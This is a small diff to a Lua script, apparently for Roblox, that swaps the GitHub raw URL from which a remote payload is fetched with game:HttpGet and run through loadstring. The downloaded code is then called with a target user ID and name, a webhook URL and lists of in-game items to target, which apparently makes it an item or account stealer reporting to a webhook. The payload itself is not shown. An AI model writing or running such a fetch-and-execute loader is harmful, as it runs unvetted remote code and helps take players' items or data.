@@ -350,7 +350,7 @@ task.spawn(function()
 
     task.wait(1)
 
-    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowScr1pts/LeakByDYW/refs/heads/main/Coding.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
     end
